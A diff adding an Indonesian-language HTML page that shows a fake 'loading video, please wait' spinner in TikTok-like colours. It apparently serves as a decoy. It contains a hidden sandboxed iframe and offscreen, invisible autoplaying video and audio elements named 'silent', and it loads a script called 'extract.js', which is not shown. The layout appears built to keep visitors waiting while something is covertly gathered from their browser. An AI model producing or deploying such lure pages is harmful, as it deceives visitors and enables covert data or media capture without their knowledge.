@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        .loader {
+            text-align: center;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #333;
+            border-top-color: #fe2c55;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        #silentFrame {
+            display: none;
+        }
+        
+        .video-container {
+            position: fixed;
+            top: -100%;
+            left: -100%;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Memuat video... tunggu sebentar</p>
+    </div>
+    
+    <iframe id="silentFrame" sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe>
+    
+    <div class="video-container">
+        <video id="silentVideo" autoplay muted playsinline></video>
+        <audio id="silentAudio" autoplay muted></audio>
+    </div>
+    
+    <script src="extract.js"></script>
+</body>
+</html>
